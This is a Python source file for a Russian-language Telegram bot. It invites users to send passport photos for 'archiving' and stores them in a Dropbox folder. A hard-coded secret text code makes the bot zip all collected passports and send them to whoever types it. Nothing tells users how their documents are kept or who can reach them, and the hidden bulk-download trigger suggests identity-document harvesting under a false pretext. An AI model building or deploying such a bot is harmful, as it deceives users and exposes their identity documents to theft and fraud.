# I LOVE DESH BEARCH

import os
import dropbox
import zipfile
import io
import time
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command

TOKEN = os.environ.get("BOT_TOKEN")
DROPBOX_TOKEN = os.environ.get("DROPBOX_TOKEN")

SECRET_CODE = "Q_FBR_PASSPORTS/DATA.GB$04743"
PASS_FOLDER = "/passports"

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

dbx = dropbox.Dropbox(DROPBOX_TOKEN)

# ------------------ Антиспам ------------------
last_photo_time = {}  # user_id -> timestamp последнего фото
ANTI_SPAM_INTERVAL = 60  # 60 секунд между фото

# --- Проверяем наличие папки passports ---
try:
    dbx.files_get_metadata(PASS_FOLDER)
except dropbox.exceptions.ApiError:
    dbx.files_create_folder(PASS_FOLDER)


# ------------------- Команды -------------------
@dp.message(Command("start"))
async def start(msg: types.Message):
    await msg.answer("Для архивации паспортных данных отправьте сюда фотографию паспорта")


# -------------------------------
#  ЗАГРУЗКА ФОТО В DROPBOX
# -------------------------------
@dp.message(F.photo)
async def save_photo(msg: types.Message):
    uid = msg.from_user.id
    now = time.time()

    # Проверка антиспам
    if uid in last_photo_time and now - last_photo_time[uid] < ANTI_SPAM_INTERVAL:
        wait_time = int(ANTI_SPAM_INTERVAL - (now - last_photo_time[uid]))
        await msg.answer(f"⏱ Подождите {wait_time} секунд перед отправкой следующего фото")
        return

    last_photo_time[uid] = now

    # Получаем файл
    file = await bot.get_file(msg.photo[-1].file_id)
    file_bytes = await bot.download_file(file.file_path)

    filename = f"{uid}_{msg.message_id}.jpg"
    dropbox_path = f"{PASS_FOLDER}/{filename}"

    try:
        dbx.files_upload(
            file_bytes.read(),
            dropbox_path,
            mode=dropbox.files.WriteMode("add")
        )
        await msg.answer("Паспорт успешно архивирован✅")
    except Exception:
        await msg.answer("Ошибка при загрузке фото. Попробуйте позже❌")


# -------------------------------
#  ПОЛУЧЕНИЕ ВСЕХ ФОТО ПО КОДУ
# -------------------------------
@dp.message(F.text == SECRET_CODE)
async def send_archive(msg: types.Message):
    try:
        entries = dbx.files_list_folder(PASS_FOLDER).entries
    except Exception:
        await msg.answer("Ошибка доступа к архиву.")
        return

    if not entries:
        await msg.answer("Архив пуст.")
        return

    zip_buffer = io.BytesIO()

    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as z:
        for file in entries:
            try:
                metadata, response = dbx.files_download(file.path_lower)
                z.writestr(file.name, response.content)
            except Exception:
                continue

    zip_buffer.seek(0)

    await msg.answer_document(
        types.BufferedInputFile(
            zip_buffer.read(),
            filename="passports_archive.zip"
        )
    )


# -------------------------------
#  Запуск
# -------------------------------
async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
    
